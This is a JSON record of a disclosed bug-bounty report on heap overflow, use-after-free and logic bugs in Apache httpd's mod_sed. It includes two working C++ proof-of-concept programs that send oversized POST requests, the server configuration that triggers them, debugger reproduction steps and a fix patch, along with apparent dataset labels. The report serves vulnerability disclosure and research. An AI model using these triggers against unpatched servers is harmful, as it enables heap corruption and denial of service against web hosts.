{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "tdp3kel9g ",
  "title": "Read and write beyond bounds in mod_sed",
  "content": "\nThis CVE consists of several bugs in mod_sed, where overflows, truncation, uses after free and a logic error can allow a remote, unauthenticated attacker to read and/or write heap locations beyond bounds. See https://github.com/apache/httpd/commit/943f57b336f264d77e5b780c82ab73daf3d14deb and https://github.com/apache/httpd/commit/e266bd09c313a668d7cca17a8b096d189148be49 for the commits that fixed the bugs. Attached are my reports to the httpd team; email me if you need additional information.\n\nUse-after-free and truncation/overflows causing read/write beyond bounds:\nCode 7.78 KiB\n1Greetings. I have discovered a use-after-free bug in sed1.c that causes a read and/or write beyond bounds.\n2\n3The bug is that dosub() (modules/filters/sed1.c) does not update |step_vars->loc1| or |step_vars->loc2| after appending to -- and thus possibly causing an expansion and reallocation of -- |genbuf| and/or |linebuf|. If a reallocation of |linebuf| occurs, this omission leaves |step_vars->loc1| and |step_vars->loc2| pointing into the old |linebuf|, causing failures later.\n4\n5When control exits dosub(), then enters again on the next iteration of the loop in substitute() [1], a read and/or write beyond bounds occurs in the first call from dosub() to place(), because place()'s |al1| argument points to the new |linebuf|, while the |al2| argument points to the old |linebuf|. This causes place() to calculate a bogus |n|:\n6\n7   int n = al2 - al1;\n8\n9[2] and then to read and/or write beyond bounds via:\n10\n11   memcpy(sp, al1, n);\n12\n13The invalid access is only an incorrectly-shortened read or a read beyond bounds if |n| does not become negative and if\n14\n15   unsigned int reqsize = (sp - eval->genbuf) + n + 1;\n16\n17does not overflow, because in this case the resulting |genbuf| is large enough to accomodate |n| bytes of data. If, however, |n| is negative or |reqsize| overflows, |reqsize| is too small, and place() doesn't enlarge |genbuf| to accomodate the true |n|, causing the memcpy() to write beyond bounds.\n18\n19Below is a POC that demonstrates the issue.\n20\n21Use the POC thusly:\n22\n23   1. Build httpd_bug_17h.cpp (below) using Visual Studio, modifying the server IP address (127.0.0.1 in the provided code) to be instead the IP address or DNS name of the test httpd server installation.\n24\n25   2. Copy postform.htm (below) to /bug17h/postform.htm in the httpd server's ServerRoot folder.\n26\n27   3. Add the httpd.conf lines (see below) into the httpd server installation's httpd.conf in a <Location> section for the ServerRoot folder.\n28\n29   4. Restart httpd.\n30\n31   5. Attach a debugger to httpd and set a breakpoint on grow_line_buffer ().\n32\n33   6. Run httpd_bug_17h, which will send the triggering POST data to httpd.\n34\n35   7. When the breakpoint fires, check |newsize|. If it is < ~33MB let control continue. When |newsize| reaches 16MB, continuing will cause execution to resume for ~15 minutes (on a relatively-old CPU).\n36\n37   8. When |newsize| reaches ~33MB, examine and record the values of |eval->linebuf| and |eval->lspend|. Now step over the call to grow_buffer() and notice that it reallocates the line buffer, giving new values for |eval->linebuf| and |eval->lspend|.\n38\n39   9. Step out of grow_line_buffer(), etc., back into dosub(). Step the last few lines of dosub() and notice how it leaves |step_vars|'s |loc*| members pointing to the old |linebuf|.\n40\n41   10. Now set a BP on dosub()'s first call to place() and proceed.\n42\n43   11. When the BP fires, step into place(). Notice that |al2| points into the old |linebuf|, whereas |al1| points into the new |linebuf|. Step through the calculation of |n| and notice how it's bogus (in my tests, it's negative). Notice how |reqsize| also becomes bogus. Step the rest of the function and notice how the memcpy() reads beyond bounds.\n44\n45Note that the POC uses an expansion factor of 256 (i.e., one \"0\" becomes 256 \"z\" characters. I suspect that more realistic expansion factors will trigger the same bug. I am working on a POC to show that.)\n46\n47This bug is still present in trunk. https://svn.apache.org/viewvc/httpd/httpd/trunk/modules/filters/\n48\n49-------- NOTES ---------\n50[1] Of course, substitute()'s call to match() is also bogus, because it uses the un-updated |step_vars|, and thus reads from the old |linebuf|!\n51\n52[2] The use of |int| here is also bogus and can cause truncation and subsequent invalid operation. I will submit another bug involving this and other bad uses of |int| or |unsigned int| in this module, such as in the buffer-size doubling operation in grow_buffer(), which can overflow and cause the allocation of an undersized buffer, followed by a write beyond bounds. BTW, I found this bug while pursuing a POC for that bug.\n53\n54-------- httpd_bug_17h.cpp ----------------------------------------------------\n55#undef UNICODE\n56\n57#define WIN32_LEAN_AND_MEAN\n58#define _CRT_SECURE_NO_WARNINGS\n59\n60#include <windows.h>\n61#include <winsock2.h>\n62#include <ws2tcpip.h>\n63#include <stdlib.h>\n64#include <stdio.h>\n65\n66#pragma comment (lib, \"Ws2_32.lib\")\n67#pragma warning (disable:6262)\n68constexpr char SERVER_NAME[] = \"127.0.0.1\";\n69\n70int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {\n71    int iResult;\n72    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);\n73    if (*pSocket == INVALID_SOCKET) {\n74        printf(\"socket failed with error: %ld\\n\", WSAGetLastError());\n75        return SOCKET_ERROR;\n76    }\n77\n78    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));\n79    return iResult;\n80}\n81\n82int __cdecl main(void)\n83{\n84    WSADATA wsaData;\n85    int iResult;\n86\n87    SOCKET serverSocket = INVALID_SOCKET;\n88\n89    struct addrinfo* result = NULL;\n90    struct addrinfo hints;\n91\n92// Initialize Winsock\n93\n94    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n95    if (iResult != 0) {\n96        printf(\"WSAStartup failed with error: %d\\n\", iResult);\n97        return 1;\n98    }\n99\n100    ZeroMemory(&hints, sizeof(hints));\n101    hints.ai_family = AF_INET;\n102    hints.ai_socktype = SOCK_STREAM;\n103    hints.ai_protocol = IPPROTO_TCP;\n104//    hints.ai_flags = AI_PASSIVE;\n105\n106// Resolve the server's address and port\n107\n108    iResult = getaddrinfo(SERVER_NAME, \"80\", &hints, &result);\n109    if (iResult != 0) {\n110        printf(\"getaddrinfo failed with error: %d\\n\", iResult);\n111        WSACleanup();\n112        return 1;\n113    }\n114\n115// POST 16MB of data to 127.0.0.1/bug17h/postform.htm to cause the overflow and subsequent WBB.\n116\n117    iResult = ConnectSocket(result, &serverSocket);\n118\n119    if (iResult == SOCKET_ERROR) {\n120        if (serverSocket != INVALID_SOCKET) {\n121            closesocket(serverSocket);\n122        }\n123        freeaddrinfo(result);\n124        WSACleanup();\n125        return 1;\n126    }\n127\n128    char req1[] =\n129        \"POST /bug17h/postform.htm HTTP/1.1\\r\\n\"\n130        \"Host: 127.0.0.1\\r\\n\"\n131        \"Accept: text/html\\r\\n\"\n132        \"Content-Type:  application/x-www-form-urlencoded\\r\\n\"\n133        \"Content-Length: 16777219\\r\\n\"\n134        \"Connection: close\\r\\n\\r\\n\";\n135\n136    const size_t sz = 16777219 + sizeof(req1) + 2; // for ending \\n and 0\n137    char* pReq1 = new char[sz];\n138    memcpy(pReq1, req1, strlen(req1));\n139    memset(&pReq1[strlen(req1)], '0', sz - strlen(req1));\n140    memcpy(&pReq1[strlen(req1)], \"t1=\", 3);\n141    pReq1[sz - 2] = '\\n';\n142    pReq1[sz - 1] = 0;\n143\n144    iResult = send(serverSocket, pReq1, sz, 0);\n145    if (iResult == SOCKET_ERROR) {\n146        closesocket(serverSocket);\n147        freeaddrinfo(result);\n148        WSACleanup();\n149        return 1;\n150    }\n151\n152// Receive and throw away the response.\n153\n154    char recvBuf[65536];\n155\n156    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);\n157    closesocket(serverSocket);\n158\n159// The bug has been triggered. Cleanup and exit.\n160\n161    closesocket(serverSocket);\n162    freeaddrinfo(result);\n163    WSACleanup();\n164\n165    return 0;\n166}\n167\n168-------- httpd_bug_17h.cpp ----------------------------------------------------\n169\n170\n171-------- postform.htm --------------------------------------------------------\n172<!DOCTYPE html>\n173\n174<html lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\">\n175<head>\n176    <meta charset=\"utf-8\" />\n177    <title></title>\n178</head>\n179<body>\n180\n181</body>\n182</html>\n183-------- postform.htm ---------------------------------------------------------\n184\n185\n186-------- httpd.conf lines -----------------------------------------------------\n187<Location /bug17h>\n188    AddInputFilter Sed htm\n189    InputSed \"s/0/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/g\"\n190</Location>\n191-------- httpd.conf lines -----------------------------------------------------\n\nUpdate to 1, above, using an expansion ratio that is more likely to be commonly used by web-accessible servers. Also observes a denial-of-service attack (but this can be mitigated by administrator's use of length constraints):\nCode 921 Bytes\n1Greetings. I have verified that the bug described in the previous report zhbug17h can be reproduced using a more reasonable expansion factor.\n2\n3In the original POC, I used expansion factor 256, via:\n4\n5    <Location /bug17h>\n6        AddInputFilter Sed htm\n7        InputSed \"s/0/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/g\"\n8    </Location>\n9\n10I have now verified that the same bug occurs with the practical expansion factor 6, via:\n11\n12    <Location /bug17h>\n13        AddInputFilter Sed htm\n14        InputSed \"s/0/zzzzzz/g\"\n15    </Location>\n16\n17This expansion factor is similar to what might be expected in an attack on an InputSed filter that escapes HTML entities, thus expanding, say, |\"| to |&quot;| .\n18\n19\u2588\u2588\u2588\n20\n21\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\nOverflow and write beyond bounds:\nCode 6.56 KiB\n1Greetings. This submission is a follow-on to submission zhbug17h.\n2\n3grow_buffer() (modules/filters/sed1.c) can experience a write beyond bounds caused by an overflow bug. The attacker can control the exact content and amount of data written. Unlike bug zhbug17h, no particular expansion factor is needed, since the bug occurs before sed1.c's substitution code runs.\n4\n5The bug is that |int spendsize| becomes negative if an attacker sends > 0x80000000 payload bytes of data to a page being processed via an InputSed \"s//\" rule. This occurs because the sed1.c's line buffer (|linebuf|) gets enlarged in steps to 0x80000000 bytes. When it next needs to be enlarged to hold the remaining bytes beyond 0x80000000, grow_buffer() calculates:\n6\n7112:   spendsize = *spend - *buffer;\n8\n9At this point, |*spend - *buffer| is 0x80000000, but |spendsize| is an |int|, so it becomes negative.\n10\n11This then causes grow_buffer() to calculate a |spend| 0x80000000 bytes before the newly-allocated buffer's beginning via:\n12\n13120:   *spend = *buffer + spendsize;\n14\n15This updates |eval->linebuf| and |eval->lspend| via grow_line_buffer()'s call to grow_buffer():\n16\n17129:   grow_buffer(eval->pool, &eval->linebuf, &eval->lspend,\n18130:               &eval->lsize, newsize);\n19\n20When control returns to appendmem_to_linebuf(), the line\n21\n22165:   memcpy(eval->lspend, sz, len);\n23\n24writes attacker-provided data to an incorrect area in the heap, 0x80000000 bytes before the beginning of |eval->linebuf|. The amount of data written is controllable by the attacker, because it is exactly the amount of payload data transferred to httpd minus 0x80000000.\n25\n26Attached is a POC that demonstrates the bug.\n27\n28Use the POC (httpd_bug_17i.cpp, below) in the same way as the POC for bug zhbug17h, except, at step 7 et seq, do this:\n29\n30   7. When the breakpoint fires, check |newsize|. When it reaches > 0x80000000 (should be 0x80001055), step into grow_buffer().\n31\n32   8. Step to line 112. Manually evaluate |*spend - *buffer| and notice that it's 0x80000000.\n33\n34   9. Step through line 112. Notice that |spendsize| becomes 0x80000000 (which is -2147483648).\n35\n36   10. Step through line 120. Notice that |*spend| is 0x80000000 bytes *less than* |*buffer|.\n37\n38   11. Step out into grow_line_buffer(). Notice how |eval->lspend| is 0x80000000 bytes less than |eval->linebuf|.\n39\n40   12. Step out into appendmem_to_linebuf(). Step line 165 and notice how it copies 0x1055 bytes of the string \"Attack code and data!\" into the incorrect heap locations.\n41\n42   13. Set a BP on appendmem_to_linebuf() and proceed. When the BP fires, step through the memcpy() and notice how it copies an additional 0xfab bytes of simulated attack code and data into the incorrect heap locations. (total attack data copied = 0x2000 bytes)\n43\n44Note also that sed1.c contains several uses of |int|, probably all of which are unsafe in 64-bit builds because of potential overflows/truncations.\n45\n46-------- httpd_bug_17i.cpp ----------------------------------------------------\n47#undef UNICODE\n48\n49#define WIN32_LEAN_AND_MEAN\n50#define _CRT_SECURE_NO_WARNINGS\n51\n52#include <windows.h>\n53#include <winsock2.h>\n54#include <ws2tcpip.h>\n55#include <stdlib.h>\n56#include <stdio.h>\n57\n58#pragma comment (lib, \"Ws2_32.lib\")\n59#pragma warning (disable:6262)\n60constexpr char SERVER_NAME[] = \"127.0.0.1\";\n61\n62int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {\n63    int iResult;\n64    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);\n65    if (*pSocket == INVALID_SOCKET) {\n66        printf(\"socket failed with error: %ld\\n\", WSAGetLastError());\n67        return SOCKET_ERROR;\n68    }\n69\n70    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));\n71    return iResult;\n72}\n73\n74int __cdecl main(void)\n75{\n76    WSADATA wsaData;\n77    int iResult;\n78\n79    SOCKET serverSocket = INVALID_SOCKET;\n80\n81    struct addrinfo* result = NULL;\n82    struct addrinfo hints;\n83\n84// Initialize Winsock\n85\n86    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n87    if (iResult != 0) {\n88        printf(\"WSAStartup failed with error: %d\\n\", iResult);\n89        return 1;\n90    }\n91\n92    ZeroMemory(&hints, sizeof(hints));\n93    hints.ai_family = AF_INET;\n94    hints.ai_socktype = SOCK_STREAM;\n95    hints.ai_protocol = IPPROTO_TCP;\n96//    hints.ai_flags = AI_PASSIVE;\n97\n98// Resolve the server's address and port\n99\n100    iResult = getaddrinfo(SERVER_NAME, \"80\", &hints, &result);\n101    if (iResult != 0) {\n102        printf(\"getaddrinfo failed with error: %d\\n\", iResult);\n103        WSACleanup();\n104        return 1;\n105    }\n106\n107// POST 16MB of data to 127.0.0.1/bug17h/postform.htm to cause the overflow and subsequent WBB.\n108\n109    iResult = ConnectSocket(result, &serverSocket);\n110\n111    if (iResult == SOCKET_ERROR) {\n112        if (serverSocket != INVALID_SOCKET) {\n113            closesocket(serverSocket);\n114        }\n115        freeaddrinfo(result);\n116        WSACleanup();\n117        return 1;\n118    }\n119\n120#if 0 // was original bug_17h\n121\n122    char req1[] =\n123        \"POST /bug17h/postform.htm HTTP/1.1\\r\\n\"\n124        \"Host: 127.0.0.1\\r\\n\"\n125        \"Accept: text/html\\r\\n\"\n126        \"Content-Type:  application/x-www-form-urlencoded\\r\\n\"\n127        \"Content-Length: 16777219\\r\\n\"\n128        \"Connection: close\\r\\n\\r\\n\";\n129\n130    const size_t sz = 16777219 + sizeof(req1) + 2; // for ending \\n and 0\n131\n132#endif\n133    char req1[] =\n134        \"POST /bug17h/postform.htm HTTP/1.1\\r\\n\"\n135        \"Host: 127.0.0.1\\r\\n\"\n136        \"Accept: text/html\\r\\n\"\n137        \"Content-Type:  application/x-www-form-urlencoded\\r\\n\"\n138        \"Content-Length: 2147491840\\r\\n\"\n139        \"Connection: close\\r\\n\\r\\n\";\n140\n141    const size_t sz = 0x80002000 + sizeof(req1) + 2; // for ending \\n and 0\n142    char* pReq1 = new char[sz];\n143    memcpy(pReq1, req1, strlen(req1));\n144    memset(&pReq1[strlen(req1)], '0', sz - strlen(req1));\n145    memcpy(&pReq1[strlen(req1)], \"t1=\", 3);\n146    pReq1[sz - 2] = '\\n';\n147    pReq1[sz - 1] = 0;\n148    const size_t backoffset = 0x2000+3;\n149    char* pBad = pReq1 + sz - backoffset;\n150    const char acd[] = \"Attack code and data!\";\n151\n152    while (pBad <= pReq1 + sz - sizeof(acd)) {\n153        strcpy(pBad, \"Attack code and data!\");\n154        pBad += sizeof(acd);\n155    }\n156\n157    WSABUF w;\n158    w.buf = pReq1; w.len = sz;\n159    DWORD bytesSent = 0;\n160\n161    iResult = WSASend(serverSocket, &w, 1, &bytesSent, 0, NULL, NULL);\n162    if (iResult == SOCKET_ERROR) {\n163        closesocket(serverSocket);\n164        freeaddrinfo(result);\n165        WSACleanup();\n166        return 1;\n167    }\n168\n169// Receive and throw away the response.\n170\n171    char recvBuf[65536];\n172\n173    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);\n174    closesocket(serverSocket);\n175\n176// The bug has been triggered. Cleanup and exit.\n177\n178    closesocket(serverSocket);\n179    freeaddrinfo(result);\n180    WSACleanup();\n181\n182    return 0;\n183}\n184\n185-------- httpd_bug_17i.cpp ----------------------------------------------------\n\nLogic error and miscellaneous overflows probably leading to writes beyond bounds (logic-error section begins \"Good! But I see some curious code....\"):\nCode 4.28 KiB\n1On 2/9/22 11:15 PM, \u2588\u2588\u2588\u2588\u2588\u2588\u2588 wrote:\n2> See notes below. Thanks for sticking with me on this rather-extended bug-smashing journey.\n3>\n4> \u2588\u2588\u2588\n5>\n6> On 2/9/2022 12:23 AM, \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 wrote:\n7>>\n8>> On 2/8/22 11:07 PM, \u2588\u2588\u2588\u2588\u2588\u2588\u2588 wrote:\n9>>> Hi. There are still some |int| bugs here, for example\n10>>>\n11>>>      1031 static apr_status_t wline(sed_eval_t *eval, char *buf, int sz)\n12>>>\n13>>> still takes an |int| size, which probably can be made to overflow via\n14>>>\n15>>>      580          rv = wline(eval, eval->linebuf, eval->lspend - eval->linebuf);\n16>>>\n17>>> or one of the other several calls to wline().\n18>> Fixed. Thanks. I found some further ones. Please find attached the size_t patch and the combined patch\n19>\n20> Good! But I see some curious code in sed_write_output(). Line 175, beginning \"if ((status == APR_SUCCESS)...\", is odd. What\n21> happens if |status != APR_SUCCESS|? The |else| clause on lines 183-86 that does a memcpy() of size |sz| runs. But |sz| might be\n22> (much) larger than the buffer allocated by the call to alloc_outbuf() on line 172, because that call allocates only |ctx->bufsize|\n23> bytes. So this looks like a potential write-beyond-bounds bug.\n24>\n25> 161:     remainbytes = ctx->bufsize - (ctx->curoutbuf - ctx->outbuf);\n26> 162:     if (sz >= remainbytes) {\n27> 163:         if (remainbytes > 0) {\n28> 164:             memcpy(ctx->curoutbuf, buf, remainbytes);\n29> 165:             buf += remainbytes;\n30> 166:             sz -= remainbytes;\n31> 167:             ctx->curoutbuf += remainbytes;\n32> 168:         }\n33> 169:         /* buffer is now full */\n34> 170:         status = append_bucket(ctx, ctx->outbuf, ctx->bufsize);\n35> 171:         /* old buffer is now used so allocate new buffer */\n36> 172:         alloc_outbuf(ctx);\n37> 173:         /* if size is bigger than the allocated buffer directly add to output\n38> 174:          * brigade */\n39> 175:         if ((status == APR_SUCCESS) && (sz >= ctx->bufsize)) {\n40> 176:             char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);\n41> 177:             status = append_bucket(ctx, newbuf, sz);\n42> 178:             /* pool might get clear after append_bucket */\n43> 179:             if (ctx->outbuf == NULL) {\n44> 180:                 alloc_outbuf(ctx);\n45> 181:             }\n46> 182:         }\n47> 183:         else {\n48> 184:             memcpy(ctx->curoutbuf, buf, sz);\n49> 185:             ctx->curoutbuf += sz;\n50> 186:         }\n51> 187:     }\n52> 188:     else {\n53> 189:         memcpy(ctx->curoutbuf, buf, sz);\n54> 190:         ctx->curoutbuf += sz;\n55> 191:     }\n56> 192:     return status;\n57> 193: }\n58\n59Another good catch. How about:\n60\n61Index: modules/filters/mod_sed.c\n62===================================================================\n63--- modules/filters/mod_sed.c\t(revision 1897897)\n64+++ modules/filters/mod_sed.c\t(working copy)\n65@@ -168,21 +168,29 @@ static apr_status_t sed_write_output(void *dummy,\n66         }\n67         /* buffer is now full */\n68         status = append_bucket(ctx, ctx->outbuf, ctx->bufsize);\n69-        /* old buffer is now used so allocate new buffer */\n70-        alloc_outbuf(ctx);\n71-        /* if size is bigger than the allocated buffer directly add to output\n72-         * brigade */\n73-        if ((status == APR_SUCCESS) && (sz >= ctx->bufsize)) {\n74-            char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);\n75-            status = append_bucket(ctx, newbuf, sz);\n76-            /* pool might get clear after append_bucket */\n77-            if (ctx->outbuf == NULL) {\n78+        if (status == APR_SUCCESS) {\n79+            /* if size is bigger than the allocated buffer directly add to output\n80+             * brigade */\n81+            if (sz >= ctx->bufsize) {\n82+                char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);\n83+                status = append_bucket(ctx, newbuf, sz);\n84+                if (status == APR_SUCCESS) {\n85+                    /* old buffer is now used so allocate new buffer */\n86+                    alloc_outbuf(ctx);\n87+                }\n88+                else {\n89+                    clear_ctxpool(ctx);\n90+                }\n91+            }\n92+            else {\n93+                /* old buffer is now used so allocate new buffer */\n94                 alloc_outbuf(ctx);\n95+                memcpy(ctx->curoutbuf, buf, sz);\n96+                ctx->curoutbuf += sz;\n97             }\n98         }\n99         else {\n100-            memcpy(ctx->curoutbuf, buf, sz);\n101-            ctx->curoutbuf += sz;\n102+            clear_ctxpool(ctx);\n103         }\n104     }\n105     else {\n106...\nImpact\nPossible exfiltration of private data from a web server and/or its users; injection of data and/or code into web server, possibly resulting in changes of control flow.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 1000,
  "weaknesses": [
    "Heap Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1649974020,
  "report_url": "https://hackerone.com/reports/1511619",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Build httpd_bug_17h.cpp using Visual Studio, modifying the server IP address to the test httpd server's IP or DNS name."
    ],
    [
      2,
      "Copy postform.htm to /bug17h/postform.htm in the httpd server's ServerRoot folder."
    ],
    [
      3,
      "Add the provided httpd.conf lines into the httpd server's httpd.conf in a <Location> section for the ServerRoot folder."
    ],
    [
      4,
      "Restart httpd and attach a debugger to httpd, setting a breakpoint on grow_line_buffer()."
    ],
    [
      5,
      "Run httpd_bug_17h to send the triggering POST data to httpd."
    ],
    [
      6,
      "When the breakpoint fires, check |newsize|. If it is < ~33MB let control continue until |newsize| reaches ~33MB."
    ],
    [
      7,
      "Examine and record the values of |eval->linebuf| and |eval->lspend| before and after the call to grow_buffer()."
    ],
    [
      8,
      "Step out of grow_line_buffer() back into dosub() and observe how |step_vars|'s |loc*| members point to the old |linebuf|."
    ],
    [
      9,
      "Set a BP on dosub()'s first call to place() and proceed to observe the bogus |n| calculation and memcpy() read beyond bounds."
    ]
  ],
  "vuln_description": "The vulnerability involves several bugs in mod_sed, including use-after-free, truncation, overflows, and a logic error, allowing a remote attacker to read and/or write heap locations beyond bounds. The issue arises when dosub() fails to update |step_vars->loc1| or |step_vars->loc2| after appending to and potentially reallocating |genbuf| and/or |linebuf|, leading to incorrect pointer calculations and memory operations.",
  "reason": "This vulnerability involves multiple complex components including buffer management, pointer arithmetic, and memory reallocation. The attacker must understand the interaction between these components and how improper pointer updates after reallocation can lead to memory corruption. The subtlety of the pointer management and the non-obvious consequences of buffer expansion make this a complex issue to discover and exploit.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}